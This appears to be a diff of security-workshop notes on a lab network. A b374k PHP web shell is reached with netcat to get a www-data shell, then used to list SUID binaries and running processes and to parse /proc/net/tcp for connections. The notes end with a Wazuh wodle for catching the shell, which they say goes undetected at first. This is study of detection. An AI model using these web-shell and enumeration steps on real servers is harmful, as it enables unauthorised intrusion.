@@ -5,14 +5,6 @@ http://192.168.128.49/workshop1/images/
 http://192.168.128.49/workshop1/images/tonipm.php
 Press 'Go'.
 
-```
-nc 192.168.128.49 13123
-
-
-nc 192.168.128.119 13123
-
-192.168.128.119
-```
 
 ```
 $ nc 192.168.128.49 13123
@@ -67,5 +59,95 @@ $s_ver = "2.8"; // shell ver
 ....
 ```
 
+```
+$ nc 192.168.128.49 13123
+b374k shell : connected
+/bin/sh: 0: can't access tty; job control turned off
+/etc>whoami
+www-data
+/etc>
+```
 
-nc -l -v -p port 13123
+Find files with SUID permission:
+
+```
+/etc>find /usr/bin -perm -u=s -type f
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/at
+/usr/bin/sudo
+```
+
+If we check the list of process running in the vulnerable machine during the metasploit attack, we will see some suspicious processes:
+
+```
+/etc>ps -eo user,pid,cmd | grep www-data
+www-data     864 /usr/sbin/apache2 -k start
+www-data     865 /usr/sbin/apache2 -k start
+www-data     866 /usr/sbin/apache2 -k start
+www-data     867 /usr/sbin/apache2 -k start
+www-data     868 /usr/sbin/apache2 -k start
+www-data    2582 /usr/sbin/apache2 -k start
+www-data    2583 /usr/sbin/apache2 -k start
+www-data    3431 /usr/sbin/apache2 -k start
+www-data    3432 /usr/sbin/apache2 -k start
+www-data    3433 /usr/sbin/apache2 -k start
+www-data    4521 sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data    4522 /bin/sh -i
+www-data    4523 sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data    4524 /bin/sh -i
+www-data    4563 sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data    4564 /bin/sh -i
+www-data    4565 sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i
+www-data    4566 /bin/sh -i
+www-data    4954 ps -eo user,pid,cmd
+www-data    4955 grep www-data
+```
+
+We can use netstat to get opened TCP connections, but there is no netstat installed in the server.
+
+```
+netstat -tnp
+```
+
+It can also be done with the command shown below.
+
+```
+/etc>grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+0.0.0.0:0
+192.168.128.197:13123
+192.168.128.90:60666
+192.168.128.80:1514
+```
+
+```
+<wodle name="command">
+    <disabled>no</disabled>
+    <tag>ps-list</tag>
+    <command>ps -eo user,pid,cmd</command>
+    <interval>10s</interval>
+    <ignore_output>no</ignore_output>
+    <run_on_start>yes</run_on_start>
+    <timeout>5</timeout>
+</wodle>
+```
+
+
+https://192.168.128.80
+
+A priori the Wazuh manager does not detect the reverse shell 
